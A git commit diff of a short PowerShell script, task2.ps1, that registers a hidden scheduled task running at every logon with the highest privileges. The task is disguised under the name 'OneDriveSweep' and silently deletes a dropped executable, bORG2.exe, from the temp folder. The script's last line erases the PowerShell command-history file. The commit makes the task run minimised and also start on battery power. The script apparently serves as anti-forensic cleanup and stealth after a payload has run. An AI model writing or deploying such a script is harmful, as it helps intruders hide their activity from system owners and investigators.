8d36a58ac852356188dfee28c02b949a3a43dd92
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-06 18:22:16 -0600

    Update task2.ps1

--- task2.ps1
+++ task2.ps1
@@ -1,7 +1,7 @@
-$action = New-ScheduledTaskAction -Execute 'powershell' -Argument 'rm "$env:TMP\bORG2.exe" -r -Force -ErrorAction SilentlyContinue'
+$action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c start /min "" powershell rm "$env:TMP\bORG2.exe" -r -Force -ErrorAction SilentlyContinue'
 $trigger = New-ScheduledTaskTrigger -AtLogon
 $principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
+$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -AllowStartIfOnBatteries
 $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 Register-ScheduledTask T1 -InputObject $task -Force -TaskName OneDriveSweep -User $env:UserName
 Remove-Item (Get-PSreadlineOption).HistorySavePath
